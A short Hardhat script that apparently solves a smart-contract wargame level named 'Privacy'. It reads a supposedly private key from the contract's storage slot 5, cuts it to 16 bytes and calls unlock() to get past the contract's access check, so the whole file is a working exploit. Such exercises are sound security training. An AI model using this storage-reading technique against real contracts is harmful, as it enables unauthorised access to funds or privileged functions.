import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x46018C8BC45F12619bc592dd9EE3f3c1172cfeBe";
const CONTRACT_NAME = "Privacy";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const dataArraySlot = 5;
  const key32 = await ethers.provider.getStorageAt(contract.address, dataArraySlot);
  const key16 = key32.slice(0, 16 * 2 + 2); // 16 bytes * 2 char + 2 char (0x)

  const tx = await contract.unlock(key16);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
